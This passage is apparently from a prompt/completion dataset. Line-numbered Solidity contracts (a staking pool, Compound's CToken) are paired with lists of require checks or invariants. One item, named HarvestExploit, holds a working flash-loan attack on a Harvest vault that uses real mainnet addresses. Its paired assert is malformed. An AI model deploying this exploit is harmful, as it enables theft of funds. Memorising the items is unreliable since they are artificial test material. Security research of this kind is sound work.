_relationship;\n183     }\n\n184     function setTokenAddress(address _tokenAddress) external onlyOwner {\n185         tokenAddress = _tokenAddress;\n186     }\n187     function setVaultContractAddress(address _vaultContractAddress) external onlyOwner {\n188         vaultContractAddress = _vaultContractAddress;\n189     }\n190     function setFarmingContractAddress(address _farmingContractAddress) external onlyOwner {\n191         farmingContractAddress = _farmingContractAddress;\n192     }\n\n193     function setLevelPoolContractAddress(address _levelPoolContractAddress) external onlyOwner {\n194         levelPoolContractAddress = _levelPoolContractAddress;\n195     }\n\n196     function setRelationshipReward(uint256 _amount) external onlyOwner {\n197         RELATIONSHIP_REWARD = _amount;\n198     }\n199     function setOnlyRunnerScript(address _onlyRunnerScript) external onlyOwner {\n200         runnerScriptAddress = _onlyRunnerScript;\n201     }\n202     function setNewSinglePoolAddress(address _newSinglePoolAddress) external onlyOwner {\n203         newSinglePoolAddress = _newSinglePoolAddress;\n204     }\n\n205     function setGymWBNBPair(address[] memory  _GymWBNBPair) external onlyOwner {\n206         GymWBNBPair = _GymWBNBPair;\n207     }\n208     function setPancakeRouterAddress(address _pancakeRouterAddress) external onlyOwner {\n209         pancakeRouterAddress = _pancakeRouterAddress;\n210     }\n\n211     function setIsPoolActive(bool _isPoolActive) external onlyOwner {\n212         isPoolActive = _isPoolActive;\n213     }\n214     function setIsInMigrationToVTwo(bool _isInMigrationToVTwo) external onlyOwner {\n215         isInMigrationToVTwo = _isInMigrationToVTwo;\n216     }\n\n217     function setHolderRewardContractAddress(address _holderRewardContractAddress) external onlyOwner {\n218         holderRewardContractAddress = _holderRewardContractAddress;\n219     }\n\n\n220     function setWbnbAndUSDTTokenArray(address[] memory _wbnbAndUSDTTokenArray) external onlyOwner {\n221         wbnbAndUSDTTokenArray = _wbnbAndUSDTTokenArray;\n222     }\n223     function setUnlockedTimestampQualification(uint256 _unlockedTimestampQualification) external onlyOwner {\n224         unlockedTimestampQualification = _unlockedTimestampQualification;\n225     }\n226     function setLevels(uint256[16] calldata _levels) external onlyOwner {\n227         levels = _levels;\n228     }\n\n229      /**\n230      * @notice  Function to set Treasury address\n231      * @param _treasuryAddress Address of treasury address\n232      */\n233     function setTreasuryAddress(address _treasuryAddress) external nonReentrant onlyOwner {\n234         treasuryAddress = _treasuryAddress;\n235     }\n\n236     /**\n237      * @notice Deposit in given pool\n238      * @param _depositAmount: Amount of want token that user wants to deposit\n239      */\n240     function deposit(\n241         uint256 _depositAmount,\n242         uint8 _periodId,\n243         uint256 _referrerId,\n244         bool isUnlocked\n245     ) external  {\n246         require(isPoolActive,'Contract is not running yet');\n247         IGymMLM(relationship).addGymMLM(msg.sender, _referrerId);\n248         _deposit(_depositAmount,_periodId,isUnlocked);\n249     }\n250     /**\n251      * @notice Deposit in given pool\n252      * @param _depositAmount: Amount of want token that user wants to deposit\n253      */\n254     function depositFromOtherContract(\n255         uint256 _depositAmount,\n256         uint8 _periodId,\n257         bool isUnlocked,\n258         address _from\n259     ) external onlyBank {\n260         require(isPoolActive,'Contract is not running yet');\n261         _autoDeposit(_depositAmount,_periodId,isUnlocked,_from);\n\n262         _updateLevelPoolQualification(_from);\n263     }\n\n264     /**\n265      * @notice To get User level in other contract for single pool.\n266      * @param _user: User address\n267      */\n268     function getUserLevelInSinglePool(address _user) external view returns (uint32) {\n269         uint256 _totalDepositDollarValue = userInfo[_user].totalDepositDollarValue;\n270         uint32 level = 0;\n271         for (uint32 i = 0; i<levels.length ; i++) {\n272             if(_totalDepositDollarValue >= levels[i]) {\n273                 level=i;\n274             }\n275         }\n276         return level;\n277     }\n\n278     /**\n279     Should approve allowance before initiating\n280     accepts depositAmount in WEI\n281     periodID - id of months array accordingly\n282     */\n283     function _deposit(\n284         uint256 _depositAmount,\n285         uint8 _periodId,\n286         bool _isUnlocked\n287     ) private {\n288         UserInfo storage user = userInfo[msg.sender];\n289         IERC20Upgradeable token = IERC20Upgradeable(tokenAddress);\n290         PoolInfo storage pool = poolInfo;\n291         updatePool();\n\n292         uint256 period = months[_periodId];\n293         uint256 lockTimesamp = DateTime.addMonths(block.timestamp,months[_periodId]);\n294         uint256 burnTokensAmount = 0;\n\n295         if(!_isUnlocked) {\n296             burnTokensAmount = (_depositAmount * 4) / 100;\n297             totalBurntInSinglePool += burnTokensAmount;\n298             IERC20Burnable(tokenAddress).burnFrom(msg.sender,burnTokensAmount);\n299         }\n\n        \n300         uint256 amountToDeposit = _depositAmount - burnTokensAmount;\n\n301         token.safeTransferFrom(msg.sender, address(this), amountToDeposit);\n302         uint256 UsdValueOfGym = ((amountToDeposit * getPrice())/1e18) / 1e18;\n\n303         user.totalDepositTokens += amountToDeposit;\n304         user.totalDepositDollarValue += UsdValueOfGym;\n305         totalGymnetLocked += amountToDeposit;\n306         if(_isUnlocked) {\n307             totalGymnetUnlocked += amountToDeposit;\n308             period = 0; \n309             lockTimesamp = DateTime.addSeconds(block.timestamp,months[_periodId]);\n310         }\n\n311         uint256 rewardDebt = (amountToDeposit * (pool.accRewardPerShare)) / (1e18);\n312         UserDeposits memory depositDetails = UserDeposits(\n313             {\n314                 depositTokens: amountToDeposit, \n315                 depositDollarValue: UsdValueOfGym,\n316                 stakePeriod: period,\n317                 depositTimestamp: block.timestamp,\n318                 withdrawalTimestamp: lockTimesamp,\n319                 rewardsGained: 0,\n320                 is_finished: false,\n321                 rewardsClaimt: 0,\n322                 rewardDebt: rewardDebt\n323             }\n324         );\n\n325         user_deposits[msg.sender].push(depositDetails);\n326         user.depositId = user_deposits[msg.sender].length;\n        \n\n327        for (uint i = 0; i<levels.length ; i++) {\n328             if(user.totalDepositDollarValue >= levels[i]) {\n329                 user.level=i;\n330             }\n331         }\n332         _updateLevelPoolQualification(msg.sender);\n333         emit Deposit(msg.sender, _depositAmount,_periodId);\n334     }\n\n335      /**\n336     Should approve allowance before initiating\n337     accepts depositAmount in WEI\n338     periodID - id of months array accordingly\n339     */\n340     function _autoDeposit(\n341         uint256 _depositAmount,\n342         uint8 _periodId,\n343         bool _isUnlocked,\n344         address _from\n345     ) private {\n346         UserInfo storage user = userInfo[_from];\n347         IERC20Upgradeable token = IERC20Upgradeable(tokenAddress);\n348         PoolInfo storage pool = poolInfo;\n349         token.approve(address(this), _depositAmount);\n350         updatePool();\n351         uint256 period = months[_periodId];\n352         uint256 lockTimesamp = DateTime.addMonths(block.timestamp,months[_periodId]);\n353         uint256 burnTokensAmount = 0;\n354         // if(!_isUnlocked) {\n355         //     uint256 burnTokensAmount = (_depositAmount * 4) / 100;\n356         //     totalBurntInSinglePool += burnTokensAmount;\n357         //     IERC20Burnable(tokenAddress).burnFrom(msg.sender,burnTokensAmount);\n358         // }\n359         uint256 amountToDeposit = _depositAmount - burnTokensAmount;\n360         uint256 UsdValueOfGym = ((amountToDeposit * getPrice())/1e18) / 1e18;\n\n361         user.totalDepositTokens += amountToDeposit;\n362         user.totalDepositDollarValue += UsdValueOfGym;\n363         totalGymnetLocked += amountToDeposit;\n364         if(_isUnlocked) {\n365             totalGymnetUnlocked += amountToDeposit;\n366             period = 0; \n367             lockTimesamp = DateTime.addSeconds(block.timestamp,months[_periodId]);\n368         }\n\n369         uint256 rewardDebt = (amountToDeposit * (pool.accRewardPerShare)) / (1e18);\n370         UserDeposits memory depositDetails = UserDeposits(\n371             {\n372                 depositTokens: amountToDeposit, \n373                 depositDollarValue: UsdValueOfGym,\n374                 stakePeriod: period,\n375                 depositTimestamp: block.timestamp,\n376                 withdrawalTimestamp: lockTimesamp,\n377                 rewardsGained: 0,\n378                 is_finished: false,\n379                 rewardsClaimt: 0,\n380                 rewardDebt: rewardDebt\n381             }\n382         );\n383         user_deposits[_from].push(depositDetails);\n384         user.depositId = user_deposits[_from].length;\n \n385         emit Deposit(_from, amountToDeposit,_periodId);\n386     }\n\n387      /**\n388      * Returns the latest price\n389      */\n390     function getPrice () public view returns (uint) {\n391         uint256[] memory gymPriceInUSD = IPancakeRouter02(pancakeRouterAddress).getAmountsOut(1000000000000000000,GymWBNBPair);\n392         uint256[] memory BNBPriceInUSD = IPancakeRouter02(pancakeRouterAddress).getAmountsOut(1, wbnbAndUSDTTokenArray);\n393         return gymPriceInUSD[1] * BNBPriceInUSD[1];\n394     }\n\n\n395     /**\n396      * @notice withdraw one claim\n397      * @param _depositId: is the id of user element. \n398      */\n399     function withdraw(\n400         uint256 _depositId\n401     ) external  {\n402         require(_depositId >= 0, \"Value is not specified\");\n403         updatePool();\n404         _withdraw(_depositId);\n\n405         _updateLevelPoolQualification(msg.sender);\n406     }\n\n407     /**\n408     Should approve allowance before initiating\n409     accepts _depositId - is the id of user element. \n410     */\n411     function _withdraw(\n412             uint256 _depositId\n413         ) private {\n414             UserInfo storage user = userInfo[msg.sender];\n415             IERC20Upgradeable token = IERC20Upgradeable(tokenAddress);\n416             PoolInfo storage pool = poolInfo;\n417             UserDeposits storage depositDetails = user_deposits[msg.sender][_depositId];\n418             if(!isInMigrationToVTwo) {\n419                 require(block.timestamp > depositDetails.withdrawalTimestamp,\"Locking Period isn't over yet.\");\n420             }\n421             require(!depositDetails.is_finished,\"You already withdrawn your deposit.\");\n\n422             _claim(_depositId,1);\n423             depositDetails.rewardDebt = (depositDetails.depositTokens * (pool.accRewardPerShare)) / (1e18);\n\n424             user.totalDepositTokens -=  depositDetails.depositTokens;\n425             user.totalDepositDollarValue -=  depositDetails.depositDollarValue;\n426             totalGymnetLocked -= depositDetails.depositTokens;\n427             if(depositDetails.stakePeriod == 0) {\n428                 totalGymnetUnlocked -= depositDetails.depositTokens;\n429             }\n            \n430             token.safeTransferFrom(address(this),msg.sender, depositDetails.depositTokens);\n\n431             for (uint i = 0; i<levels.length ; i++) {\n432                 if(user.totalDepositDollarValue >= levels[i]) {\n433                     user.level=i;\n434                 }\n435             }\n436             depositDetails.is_finished = true;\n437             emit Withdraw(msg.sender,  depositDetails.depositTokens,depositDetails.stakePeriod);\n\n\n438         }\n\n\n439     /**\n440      * @notice Claim rewards you gained over period\n441      * @param _depositId: is the id of user element. \n442      */\n443     function claim(\n444         uint256 _depositId\n445     ) external  {\n446         require(_depositId >= 0, \"Value is not specified\");\n447         updatePool();\n448         refreshMyLevel(msg.sender);\n449         _claim(_depositId,0);\n450     }\n\n451    /*\n452     Should approve allowance before initiating\n453     accepts _depositId - is the id of user element. \n454     */\n455     function _claim(\n456             uint256 _depositId,\n457             uint256 fromWithdraw\n458         ) private {\n459             UserInfo storage user = userInfo[msg.sender];\n460             IERC20Upgradeable token = IERC20Upgradeable(tokenAddress);\n461             UserDeposits storage depositDetails = user_deposits[msg.sender][_depositId];\n462             PoolInfo storage pool = poolInfo;\n\n463             uint256 pending = pendingReward(_depositId,msg.sender);\n\n464             if(fromWithdraw == 0) {\n465                 require(pending > 0 ,\"No rewards to claim.\");\n466             }\n\n\n467             if (pending > 0) {\n468                 uint256 distributeRewardTokenAmt = (pending * RELATIONSHIP_REWARD) / 100;\n469                 token.safeTransfer(relationship, distributeRewardTokenAmt);\n470                 IGymMLM(relationship).distributeRewards(pending, address(tokenAddress), msg.sender, 3);\n\n471                 // 6% distribution \n472                 uint256 calculateDistrubutionReward = (pending * 6) / 100;\n473                 poolRewardsAmount += calculateDistrubutionReward; \n                \n474                 uint256 calcUserRewards = (pending-distributeRewardTokenAmt-calculateDistrubutionReward);\n475                 safeRewardTransfer(tokenAddress, msg.sender, calcUserRewards);\n\n476                 user.totalClaimt += calcUserRewards;\n477                 totalClaimtInPool += pending;\n478                 depositDetails.rewardsClaimt += pending;\n479                 depositDetails.rewardDebt = (depositDetails.depositTokens * (pool.accRewardPerShare)) / (1e18);\n480                 emit ClaimUserReward(msg.sender,  calcUserRewards);\n481                  depositDetails.rewardsGained = 0;\n482             }\n            \n483             // token.safeTransferFrom(address(this),msg.sender, depositDetails.rewardsGained);\n\n484         }\n\n\n      \n485    /*\n486     transfers pool commisions to management\n487     */\n488     function transferPoolRewards() public onlyRunnerScript {\n489             require(address(holderRewardContractAddress) != address(0x0),\"Holder Reward Address::SET_ZERO_ADDRESS\");\n490             IERC20Upgradeable token = IERC20Upgradeable(tokenAddress);\n491             token.safeTransfer(holderRewardContractAddress, poolRewardsAmount);\n492             // token.safeTransfer(relationship, poolRewardsAmount/2);\n493             poolRewardsAmount = 0;\n494         }  \n\n\n495     /**\n496      * @notice  Safe transfer function for reward tokens\n497      * @param _rewardToken Address of reward token contract\n498      * @param _to Address of reciever\n499      * @param _amount Amount of reward tokens to transfer\n500      */\n501     function safeRewardTransfer(\n502         address _rewardToken,\n503         address _to,\n504         uint256 _amount\n505     ) internal {\n506         uint256 _bal = IERC20Upgradeable(_rewardToken).balanceOf(address(this));\n507         if (_amount > _bal) {\n508             require(IERC20Upgradeable(_rewardToken).transfer(_to, _bal), \"GymSinglePool:: Transfer failed\");\n509         } else {\n510             require(IERC20Upgradeable(_rewardToken).transfer(_to, _amount), \"GymSinglePool:: Transfer failed\");\n511         }\n512     }\n513     /**\n514      * @notice To get User Info in other contract.\n515      */\n516     function getUserInfo(address _user) external view returns (UserInfo memory) {\n517         return userInfo[_user];\n518     }\n\n519         /**\n520      * @notice View function to see pending reward on frontend.\n521      * @param _depositId: Staking pool id\n522      * @param _user: User address\n523      */\n524     function pendingReward(uint256 _depositId, address _user) public view returns (uint256) {\n525         UserDeposits storage depositDetails = user_deposits[_user][_depositId];\n526         UserInfo storage user = userInfo[_user];\n527         PoolInfo storage pool = poolInfo;\n528         if(depositDetails.is_finished == true || depositDetails.stakePeriod == 0){\n529             return 0;\n530         }\n      \n531         uint256 _accRewardPerShare = pool.accRewardPerShare;\n532         uint256 sharesTotal = totalGymnetLocked-totalGymnetUnlocked;\n\n533         if (block.number > pool.lastRewardBlock && sharesTotal != 0) {\n534             uint256 _multiplier = block.number - pool.lastRewardBlock;\n535             uint256 _reward = (_multiplier * pool.rewardPerBlock);\n536              _accRewardPerShare = _accRewardPerShare + ((_reward * 1e18) / sharesTotal);\n537         }\n\n538         return (depositDetails.depositTokens * _accRewardPerShare) / (1e18) - (depositDetails.rewardDebt);\n539     }\n\n\n540     /**\n541      * @notice Update reward variables of the given pool to be up-to-date.\n542      */\n543     function updatePool() public {\n544         PoolInfo storage pool = poolInfo;\n545         if (block.number <= pool.lastRewardBlock) {\n546             return;\n547         }\n548         uint256 sharesTotal = totalGymnetLocked-totalGymnetUnlocked;\n549         if (sharesTotal == 0) {\n550             pool.lastRewardBlock = block.number;\n551             return;\n552         }\n553         uint256 multiplier = block.number - pool.lastRewardBlock;\n554         if (multiplier <= 0) {\n555             return;\n556         }\n557         uint256 _rewardPerBlock = pool.rewardPerBlock;\n558         uint256 _reward = (multiplier * _rewardPerBlock);\n559         pool.accRewardPerShare = pool.accRewardPerShare + ((_reward * 1e18) / sharesTotal);\n560         pool.lastRewardBlock = block.number;\n561     }\n562     /**\n563      * @notice Claim All Rewards in one Transaction Internat Function.\n564      * If reinvest = true, Rewards will be reinvested as a new Staking\n565      * Reinvest Period Id is the id of months element\n566      */\n567     function _claimAll(bool reinvest,uint8 reinvestPeriodId) private {\n568         UserInfo storage user = userInfo[msg.sender];\n569         IERC20Upgradeable token = IERC20Upgradeable(tokenAddress);\n570         PoolInfo storage pool = poolInfo;\n571          updatePool();\n572          uint256 distributeRewardTokenAmtTotal = 0;\n573          uint256 calcUserRewardsTotal = 0;\n574          uint256 totalDistribute = 0;\n575         for (uint256 i = 0; i<user.depositId ; i++) {\n576             UserDeposits storage depositDetails = user_deposits[msg.sender][i];\n577             uint256 pending = pendingReward(i,msg.sender);\n578             totalDistribute += pending;\n579             if (pending > 0) {\n580                 uint256 distributeRewardTokenAmt = (pending * RELATIONSHIP_REWARD) / 100;\n581                  distributeRewardTokenAmtTotal += distributeRewardTokenAmt;\n582                 // 6% distribution \n583                 uint256 calculateDistrubutionReward = (pending * 6) / 100;\n584                 poolRewardsAmount += calculateDistrubutionReward; \n                \n585                 uint256 calcUserRewards = (pending-distributeRewardTokenAmt-calculateDistrubutionReward);\n586                 calcUserRewardsTotal += calcUserRewards;\n\n587                 user.totalClaimt += calcUserRewards;\n588                 totalClaimtInPool += pending;\n589                 depositDetails.rewardsClaimt += pending;\n590                 depositDetails.rewardDebt = (depositDetails.depositTokens * (pool.accRewardPerShare)) / (1e18);\n591                 emit ClaimUserReward(msg.sender,  calcUserRewards);\n592                  depositDetails.rewardsGained = 0;\n593             }\n            \n594         }\n595         token.safeTransfer(relationship, distributeRewardTokenAmtTotal);\n596         IGymMLM(relationship).distributeRewards(totalDistribute, address(tokenAddress), msg.sender, 3);\n597         safeRewardTransfer(tokenAddress, msg.sender, calcUserRewardsTotal);\n598         if(reinvest == true) {\n599           _deposit(calcUserRewardsTotal,reinvestPeriodId,false);\n600         }\n601     }\n602     /**\n603      * @notice Claim All Rewards in one Transaction.\n604      */\n605     function claimAll() public {\n606          refreshMyLevel(msg.sender);\n607         _claimAll(false,0);\n608     }\n609     /**\n610      * @notice Claim and Reinvest all rewards public function to trigger internal _claimAll function.\n611      */\n612     function claimAndReinvest(bool reinvest,uint8 periodId) public {\n613         require(isPoolActive,'Contract is not running yet');\n614         _claimAll(reinvest,periodId);\n615     }\n\n616     function refreshMyLevel(address _user) public {\n617         UserInfo storage user = userInfo[_user];\n618         for (uint i = 0; i<levels.length ; i++) {\n619             if(user.totalDepositDollarValue >= levels[i]) {\n620                 user.level=i;\n621             }\n622         }\n623     }\n624     function totalLockedTokens(address _user) public view returns (uint256) {\n625         UserInfo storage user = userInfo[_user];\n626         uint256 totalDepositLocked = 0;\n627         for (uint256 i = 0; i<user.depositId ; i++) {\n628             UserDeposits storage depositDetails = user_deposits[_user][i];\n629             if(depositDetails.stakePeriod != 0 && !depositDetails.is_finished) {\n630                 totalDepositLocked += depositDetails.depositTokens;\n631             } \n632         }\n633         return totalDepositLocked;\n634     }\n\n635     function switchToUnlocked(uint256 _depositId) public {\n636         UserInfo storage user = userInfo[msg.sender];\n637         UserDeposits storage depositDetails = user_deposits[msg.sender][_depositId];\n638         require(depositDetails.depositTimestamp <= unlockedTimestampQualification,'Function is only for Users that deposited before Unlocked Staking Upgrade');\n639         _claim(_depositId,1);\n640         uint256 lockTimesamp = DateTime.addSeconds(block.timestamp,1);\n\n641         depositDetails.stakePeriod = 0;\n642         depositDetails.withdrawalTimestamp = lockTimesamp;\n643         totalGymnetUnlocked += depositDetails.depositTokens;\n\n644     }\n\n645     function _updateLevelPoolQualification(address wallet) internal {\n646         uint256 userLevel = IGymMLM(relationship).getUserCurrentLevel(wallet);\n647         IGymLevelPool(levelPoolContractAddress).updateUserQualification(wallet, userLevel);\n648     }\n\n649     function transferToV2(uint8 _periodId,bool isUnlocked) public {\n650         require(address(0) != newSinglePoolAddress,'Single pool cannot be Zero address');\n651         UserInfo storage user = userInfo[msg.sender];\n652          require(user.totalDepositTokens > 0,'You dont have Any Deposits to Transfer');\n653          if(isUnlocked) {\n654             _periodId = 0;\n655          }\n656         _claimAll(false,0);\n657         uint256 dollarValueOfDeposits = user.totalDepositDollarValue * 1e18;\n658         IGymSinglePool(newSinglePoolAddress).transferFromOldVersion(\n659              user.totalDepositTokens,\n660              _periodId,\n661              isUnlocked,\n662              msg.sender,\n663              dollarValueOfDeposits\n664         );\n665         for (uint32 i = 0; i<user.depositId ; i++) {\n666             UserDeposits storage depositDetails = user_deposits[msg.sender][i];\n667             depositDetails.depositTokens = 0;\n668             depositDetails.is_finished = true;\n669             totalGymnetLocked -= depositDetails.depositTokens;\n670             if(depositDetails.stakePeriod == 0) {\n671                 totalGymnetUnlocked -= depositDetails.depositTokens;\n672             }\n673         }\n\n674         user.totalDepositDollarValue = 0;\n675         user.totalDepositTokens = 0;\n\n676     }\n677     function burnOldTokens() public onlyOwner {\n678         uint256 _bal = IERC20Upgradeable(tokenAddress).balanceOf(address(this));\n679         IERC20Burnable(tokenAddress).burnFrom(address(this),_bal);\n680     }\n681 }",
        "completion": "128     modifier onlyRunnerScript() {\n           require(msg.sender == runnerScriptAddress || msg.sender == owner(), \"Only Runner Script\");\n          _;\n     }\n132     modifier onlyBank() {\n         require(msg.sender == vaultContractAddress, \"GymFarming:: Only bank\");\n         _;\n     }\n148    require(block.number < _startBlock, \"SinglePool: Start block must have a bigger value\");\n171    onlyOwner\n178    onlyOwner\n181     onlyOwner\n184    onlyOwner\n193    onlyOwner\n196    onlyOwner\n199     onlyOwner\n202    onlyOwner\n205    onlyOwner\n211    onlyOwner\n214    onlyOwner\n217    onlyOwner\n220    onlyOwner\n223    onlyOwner\n226    onlyOwner\n233    onlyOwner\n246         require(isPoolActive,'Contract is not running yet');\n254         onlyBank\n259        onlyBank\n260         require(isPoolActive,'Contract is not running yet');\n402         require(_depositId >= 0, \"Value is not specified\");\n419         require(block.timestamp > depositDetails.withdrawalTimestamp,\"Locking Period isn't over yet.\");\n421        require(!depositDetails.is_finished,\"You already withdrawn your deposit.\");\n446         require(_depositId >= 0, \"Value is not specified\");\n465         require(pending > 0 ,\"No rewards to claim.\");\n488         onlyRunnerScript\n\n489         require(address(holderRewardContractAddress) != address(0x0),\"Holder Reward Address::SET_ZERO_ADDRESS\");\n508          require(IERC20Upgradeable(_rewardToken).transfer(_to, _bal), \"GymSinglePool:: Transfer failed\");\n510         require(IERC20Upgradeable(_rewardToken).transfer(_to, _amount), \"GymSinglePool:: Transfer failed\");\n613         require(isPoolActive,'Contract is not running yet');\n638         require(depositDetails.depositTimestamp <= unlockedTimestampQualification,'Function is only for Users that deposited before Unlocked Staking Upgrade');\n650         require(address(0) != newSinglePoolAddress,'Single pool cannot be Zero address');\n652         require(user.totalDepositTokens > 0,'You dont have Any Deposits to Transfer');"
    },
    {
        "prompt": "1 pragma solidity ^0.6.0;\n\n\n2 interface IUniswapV2Pair {\n3     function swap(\n4         uint256 amount0Out,\n5         uint256 amount1Out,\n6         address to,\n7         bytes calldata data\n8     ) external;\n9 }\n\n10 interface IUniswapV2Callee {\n11     function uniswapV2Call(\n12         address sender,\n13         uint256 amount0,\n14         uint256 amount1,\n15         bytes calldata data\n16     ) external;\n17 }\n\n18 interface ICurve {\n19     function exchange_underlying(\n20         int128 i,\n21         int128 j,\n22         uint256 dx,\n23         uint256 min_dy\n24     ) external;\n25 }\n\n26 interface IERC20 {\n27     function balanceOf(address account) external view returns (uint256);\n\n28     function transfer(address recipient, uint256 amount)\n29         external\n30         returns (bool);\n\n31     function approve(address spender, uint256 amount) external returns (bool);\n\n32     function transferFrom(\n33         address sender,\n34         address recipient,\n35         uint256 amount\n36     ) external returns (bool);\n37 }\n\n38 interface IUSDT {\n39     function approve(address _spender, uint256 _value) external;\n\n40     function transfer(address _to, uint256 _value) external;\n41 }\n\n42 interface IFarm {\n43     function deposit(uint256) external;\n\n44     function withdraw(uint256) external;\n45 }\n\n46 contract HarvestExploit is IUniswapV2Callee {\n47     address USDT_WETH = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;\n48     address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n49     address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n50     address ySwap = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;\n51     address fUSDT = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;\n\n52     function exploit() external {\n53         IUniswapV2Pair(USDT_WETH).swap(\n54             0,\n55             50_000_000 * 1e6,\n56             address(this),\n57             abi.encode(1)\n58         );\n59     }\n\n60     function uniswapV2Call(\n61         address sender,\n62         uint256 amount0,\n63         uint256 amount1,\n64         bytes calldata data\n65     ) external override {\n66         console.log(\n67             \"Amount of USDT received\",\n68             IERC20(USDT).balanceOf(address(this))\n69         );\n70         IUSDT(USDT).approve(address(ySwap), 2**256 - 1);\n71         IUSDT(USDT).approve(address(fUSDT), 2**256 - 1);\n72         IERC20(fUSDT).approve(address(fUSDT), 2**256 - 1);\n73         IERC20(USDC).approve(address(ySwap), 2**256 - 1);\n\n74         for (uint256 i = 0; i < 4; i++) {\n75             uint256 usdcAmount = IERC20(USDC).balanceOf(address(this));\n76             console.log(\"USDC in contract\", usdcAmount);\n\n77             ICurve(ySwap).exchange_underlying(1, 2, usdcAmount, 0);\n78             console.log(\n79                 \"USDT balance after swap\",\n80                 IERC20(USDT).balanceOf(address(this))\n81             );\n\n82             uint256 slip = (IERC20(USDT).balanceOf(address(this)) * 5) / 1000;\n\n83             IFarm(fUSDT).deposit(IERC20(USDT).balanceOf(address(this)) - slip);\n\n84             uint256 fUSDTShares = IERC20(fUSDT).balanceOf(address(this));\n\n85             console.log(\"deposited\", fUSDTShares);\n\n86             ICurve(ySwap).exchange_underlying(\n87                 2,\n88                 1,\n89                 IERC20(USDT).balanceOf(address(this)),\n90                 0\n91             );\n\n92             IFarm(fUSDT).withdraw(fUSDTShares);\n\n93             console.log(\n94                 \"USDT after withdraw\",\n95                 IERC20(USDT).balanceOf(address(this))\n96             );\n97             console.log(\n98                 \"USDC after withdraw\",\n99                 IERC20(USDC).balanceOf(address(this))\n100             );\n101         }\n\n102         uint256 returnAmountFee = (amount1 * 1000) / 997 + 1;\n103         IUSDT(USDT).transfer(USDT_WETH, returnAmountFee);\n104         console.log(\"Flashloan Return Amount\", returnAmountFee);\n105     }\n106 }",
        "completion": "75+ assert(usdcAmount <= Old(usdcAmount)*k));"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: BSD-3-Clause\n2 pragma solidity ^0.8.10;\n\n3 import \"./ComptrollerInterface.sol\";\n4 import \"./CTokenInterfaces.sol\";\n5 import \"./ErrorReporter.sol\";\n6 import \"./EIP20Interface.sol\";\n7 import \"./InterestRateModel.sol\";\n8 import \"./ExponentialNoError.sol\";\n\n9 /**\n10  * @title Compound's CToken Contract\n11  * @notice Abstract base for CTokens\n12  * @author Compound\n13  */\n14 abstract contract CToken is CTokenInterface, ExponentialNoError, TokenErrorReporter {\n15     /**\n16      * @notice Initialize the money market\n17      * @param comptroller_ The address of the Comptroller\n18      * @param interestRateModel_ The address of the interest rate model\n19      * @param initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18\n20      * @param name_ EIP-20 name of this token\n21      * @param symbol_ EIP-20 symbol of this token\n22      * @param decimals_ EIP-20 decimal precision of this token\n23      */\n24     function initialize(ComptrollerInterface comptroller_,\n25                         InterestRateModel interestRateModel_,\n26                         uint initialExchangeRateMantissa_,\n27                         string memory name_,\n28                         string memory symbol_,\n29                         uint8 decimals_) public {\n30         require(msg.sender == admin, \"only admin may initialize the market\");\n31         require(accrualBlockNumber == 0 && borrowIndex == 0, \"market may only be initialized once\");\n\n32         // Set initial exchange rate\n33         initialExchangeRateMantissa = initialExchangeRateMantissa_;\n34         require(initialExchangeRateMantissa > 0, \"initial exchange rate must be greater than zero.\");\n\n35         // Set the comptroller\n36         uint err = _setComptroller(comptroller_);\n37         require(err == NO_ERROR, \"setting comptroller failed\");\n\n38         // Initialize block number and borrow index (block number mocks depend on comptroller being set)\n39         accrualBlockNumber = getBlockNumber();\n40         borrowIndex = mantissaOne;\n\n41         // Set the interest rate model (depends on block number / borrow index)\n42         err = _setInterestRateModelFresh(interestRateModel_);\n43         require(err == NO_ERROR, \"setting interest rate model failed\");\n\n44         name = name_;\n45         symbol = symbol_;\n46         decimals = decimals_;\n\n47         // The counter starts true to prevent changing it from zero to non-zero (i.e. smaller cost/refund)\n48         _notEntered = true;\n49     }\n\n50     /**\n51      * @notice Transfer `tokens` tokens from `src` to `dst` by `spender`\n52      * @dev Called by both `transfer` and `transferFrom` internally\n53      * @param spender The address of the account performing the transfer\n54      * @param src The address of the source account\n55      * @param dst The address of the destination account\n56      * @param tokens The number of tokens to transfer\n57      * @return 0 if the transfer succeeded, else revert\n58      */\n59     function transferTokens(address spender, address src, address dst, uint tokens) internal returns (uint) {\n60         /* Fail if transfer not allowed */\n61         uint allowed = comptroller.transferAllowed(address(this), src, dst, tokens);\n62         if (allowed != 0) {\n63             revert TransferComptrollerRejection(allowed);\n64         }\n\n65         /* Do not allow self-transfers */\n66         if (src == dst) {\n67             revert TransferNotAllowed();\n68         }\n\n69         /* Get the allowance, infinite for the account owner */\n70         uint startingAllowance = 0;\n71         if (spender == src) {\n72             startingAllowance = type(uint).max;\n73         } else {\n74             startingAllowance = transferAllowances[src][spender];\n75         }\n\n76         /* Do the calculations, checking for {under,over}flow */\n77         uint allowanceNew = startingAllowance - tokens;\n78         uint srcTokensNew = accountTokens[src] - tokens;\n79         uint dstTokensNew = accountTokens[dst] + tokens;\n\n80         /////////////////////////\n81         // EFFECTS & INTERACTIONS\n82         // (No safe failures beyond this point)\n\n83         accountTokens[src] = srcTokensNew;\n84         accountTokens[dst] = dstTokensNew;\n\n85         /* Eat some of the allowance (if necessary) */\n86         if (startingAllowance != type(uint).max) {\n87             transferAllowances[src][spender] = allowanceNew;\n88         }\n\n89         /* We emit a Transfer event */\n90         emit Transfer(src, dst, tokens);\n\n91         // unused function\n92         // comptroller.transferVerify(address(this), src, dst, tokens);\n\n93         return NO_ERROR;\n94     }\n\n95     /**\n96      * @notice Transfer `amount` tokens from `msg.sender` to `dst`\n97      * @param dst The address of the destination account\n98      * @param amount The number of tokens to transfer\n99      * @return Whether or not the transfer succeeded\n100      */\n101     function transfer(address dst, uint256 amount) override external returns (bool) {\n102         return transferTokens(msg.sender, msg.sender, dst, amount) == NO_ERROR;\n103     }\n\n104     /**\n105      * @notice Transfer `amount` tokens from `src` to `dst`\n106      * @param src The address of the source account\n107      * @param dst The address of the destination account\n108      * @param amount The number of tokens to transfer\n109      * @return Whether or not the transfer succeeded\n110      */\n111     function transferFrom(address src, address dst, uint256 amount) override external returns (bool) {\n112         return transferTokens(msg.sender, src, dst, amount) == NO_ERROR;\n113     }\n\n114     /**\n115      * @notice 